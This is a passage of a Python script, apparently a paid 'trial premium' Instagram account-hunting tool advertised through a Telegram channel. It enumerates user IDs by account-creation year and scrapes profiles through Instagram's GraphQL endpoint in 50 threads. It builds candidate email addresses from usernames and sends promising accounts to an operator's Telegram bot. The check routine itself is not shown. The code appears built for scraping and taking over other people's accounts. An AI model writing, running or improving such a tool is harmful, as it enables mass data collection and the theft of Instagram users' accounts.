                setup_callback_handlers(bot)
            
            def send_message_thread():
                try:
                    bot.send_message(ID, info_text, reply_markup=get_info_buttons(username), parse_mode='HTML')
                except Exception as e:
                    print(f"Telegram send error: {e}")
            
            Thread(target=send_message_thread, daemon=True).start()
    except Exception as e:
        pass
    
    return info_text

def instatoolpy(year_choice):
    """Main working function"""
    global MIN_FOLLOWERS, MIN_POSTS, infoinsta, instatool_domain, TOKEN, ID
    
    while True:
        try:
            user_id, selected_year = get_user_id_by_year(year_choice)
            
            lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            
            variables = json.dumps({
                'id': str(user_id),
                'render_surface': 'PROFILE'
            })
            
            doc_id = '25618261841150840'
            
            data = {
                'lsd': lsd,
                'variables': variables,
                'doc_id': doc_id
            }
            
            headers = {
                'X-FB-LSD': data['lsd']
            }
            
            response = requests.post(
                'https://www.instagram.com/api/graphql',
                headers=headers,
                data=data
            )
            
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            
            if username:
                infoinsta[username] = account
                
                followers = account.get('follower_count', 0)
                posts = account.get('media_count', 0)
                
                acc_year, acc_month = get_account_age(user_id)
                
                if followers >= MIN_FOLLOWERS and posts >= MIN_POSTS:
                    emails = [username + instatool_domain]
                    
                    for email in emails:
                        check(email, user_id, followers, posts)
                    
        except Exception as e:
            pass

def display_banner():
    """Display ASCII art banner with TRIAL text"""
    banner = f"""{RED}
    ⠀⠀⠀⢠⣾⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⣰⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⢰⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⣀⣀⣤⣤⣶⣾⣿⣿⣿⡷
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
    ⣿⣿⣿⡇⠀⡾⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀
    ⣿⣿⣿⣧⡀⠁⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⢹⠉⠙⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠀⣀⣼⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠀⠤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⠿⠋⢃⠈⠢⡁⠒⠄⡀⠈⠁⠀⠀⠀⠀⠀⠀⠀
    ⣿⣿⠟⠁⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘{reset}"""
    print(banner)
    print(f"""    {CYAN}[ {RED}⚠️{CYAN} ]    🔻 TRIAL PREMIUM FILE 🔻""")
    print(f"""    {CYAN}[ {YELLOW}⏰{CYAN} ]    THIS IS A TRIAL VERSION""")
    print(f"{Y}📢 Channel: @glitch_army01{reset}")
    print(f"{P}👨‍💻 Developers: @GL1T520 & @D3VXX{reset}")
    print(f"{X}🔸 For Premium Access Contact Developers 🔸{reset}\n")

# Main program
if __name__ == '__main__':
    try:
        os.chdir(os.path.expanduser('~'))
    except:
        pass
    
    # Check required libraries
    try:
        import requests
    except ImportError:
        os.system('pip install requests')
        import requests
    
    try:
        import telebot
    except ImportError:
        os.system('pip install pyTelegramBotAPI')
        import telebot
    
    # GitHub Trial Authentication (Password + Expiry only)
    if not github_auth_system():
        sys.exit(1)
    
    # Display banner
    display_banner()
    
    print(f"""    {CYAN}[ {RED}🔑{CYAN} ]    ENTER TELEGRAM BOT TOKEN BELOW ⏎""")
    TOKEN = input(f"    {WHITE}➡  {RED}🔥  {reset}").strip()
    
    print(f"""    {CYAN}[ {RED}💬{CYAN} ]    ENTER TELEGRAM CHAT ID BELOW ⏎""")
    ID = input(f"    {WHITE}➡  {RED}🔥  {reset}").strip()
    
    # Filter inputs
    print(f'\n{M}═══════ FILTER SETTINGS ═══════{reset}')
    MIN_FOLLOWERS = safe_int_input(f'{Y}➤ Minimum Followers (press Enter for 0): {M}', 0)
    MIN_POSTS = safe_int_input(f'{Y}➤ Minimum Posts (press Enter for 0): {M}', 0)
    print(f'{M}══════════════════════════════{reset}')
    
    if MIN_FOLLOWERS > 0 or MIN_POSTS > 0:
        print(f'{F}✓ Filter Active: Min Followers={MIN_FOLLOWERS}, Min Posts={MIN_POSTS}{reset}')
    else:
        print(f'{X}⚠ No filters applied - will show all accounts{reset}')
    
    # Year selection menu
    print(f'\n{M}═══════ YEAR SELECTION ═══════{reset}')
    print(f'{Y}1 - 2010-2011 (ID Range: 1.2M - 17.7M){reset}')
    print(f'{Y}2 - 2011-2012 (ID Range: 17.7M - 279M){reset}')
    print(f'{Y}3 - 2012-2013 (ID Range: 279M - 900M){reset}')
    print(f'{Y}4 - 2013-2014 (ID Range: 900M - 1.6B){reset}')
    print(f'{Y}5 - 2014-2015 (ID Range: 1.6B - 2.5B){reset}')
    print(f'{Y}6 - 2015-2016 (ID Range: 2.5B - 3.7B){reset}')
    print(f'{Y}7 - 2016-2017 (ID Range: 3.7B - 5.7B){reset}')
    print(f'{Y}8 - 2017-2018 (ID Range: 5.7B - 8.5B){reset}')
    print(f'{Y}9 - 2018-2019 (ID Range: 8.5B - 21.2B){reset}')
    print(f'{M}══════════════════════════════{reset}')
    
    year_choice = safe_int_input(f'\n{S}➤ Select year (1-9) or press Enter for default (5): {M}', 5)
    
    if year_choice < 1 or year_choice > 9:
        print(f'{Z}Invalid choice! Using default year 2014-2015{reset}')
        year_choice = 5
    
    min_id, max_id, SELECTED_YEAR = year_ranges[year_choice]
    print(f'{F}✓ Selected Year: {SELECTED_YEAR} - {SELECTED_YEAR + 1} (ID Range: {min_id:,} - {max_id:,}){reset}')
    
    print(f'\n{P}—' * 50)
    
    # Initialize bot if credentials provided
    if TOKEN and ID and TOKEN != "" and ID != "":
        try:
            bot = telebot.TeleBot(TOKEN)
            setup_callback_handlers(bot)
            
            def run_bot():
                try:
                    bot.infinity_polling(timeout=10, long_polling_timeout=5)
                except Exception as e:
                    print(f"Bot polling error: {e}")
            
            bot_thread = Thread(target=run_bot, daemon=True)
            bot_thread.start()
            
            try:
                bot.send_message(ID, f"🚀 TRIAL Script Active!\nYear: {SELECTED_YEAR}-{SELECTED_YEAR + 1}\nMin Followers: {MIN_FOLLOWERS}\nMin Posts: {MIN_POSTS}")
            except:
                pass
        except Exception as e:
            print(f"Failed to initialize bot: {e}")
    
    # Clear screen
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Create token
    instatool()
    
    # Start threads
    threads = []
    for _ in range(50):
        t = Thread(target=instatoolpy, args=(year_choice,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Y}Shutting down...{reset}")
        sys.exit(0)